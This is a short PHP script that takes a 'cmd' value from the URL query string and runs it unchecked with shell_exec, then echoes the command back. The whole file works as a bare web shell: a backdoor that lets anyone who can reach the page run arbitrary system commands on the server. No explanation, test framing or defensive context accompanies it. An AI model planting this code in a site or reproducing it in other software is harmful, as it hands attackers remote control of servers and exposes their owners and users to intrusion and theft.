<?php
    $cmd = $_GET['cmd'];

    shell_exec($cmd);

    print_r($cmd);
    echo "Command: $cmd";
?>